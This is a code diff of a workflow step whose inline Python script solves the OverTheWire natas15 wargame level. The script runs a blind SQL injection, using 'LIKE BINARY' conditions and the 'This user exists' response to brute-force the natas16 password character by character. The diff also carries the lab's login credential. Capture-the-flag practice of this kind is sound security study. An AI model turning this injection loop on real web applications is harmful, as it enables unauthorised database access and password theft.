@@ -29,22 +29,19 @@ jobs:
         import requests
 
         target = 'http://natas15.natas.labs.overthewire.org'
-        charset_0 = (
-            '0123456789' +
-            'abcdefghijklmnopqrstuvwxyz' +
-            'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
-        )
-        charset_1 = '23579adfgijklqruADEHOPRTVZ'
+        charset_1 = "23579adfgijklqruADEHOPRTVZ"
 
-        while len(charset_1) < 33:
-            for c in charset_0:
-                password = charset_1 + c
-                username = ('natas16" AND password LIKE BINARY "' + password + '%" "')
+        password = ""
+        while len(password) != 32:
+            for c in charset_1:
+                t = password + c
+                username = ('natas16" AND password LIKE BINARY "' + t + '%" "')
                 r = requests.get(target,
                         auth=('natas15','TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'),
                         params={"username": username}
                 )
                 if "This user exists" in r.text:
-                    charset_1 += c
-                    print ('CSET: ' + charset_1.ljust(len(charset_0), '*'))
+                    print ('PASS: ' + t.ljust(32, '*'))
+                    password = t
+                    break
         EOF
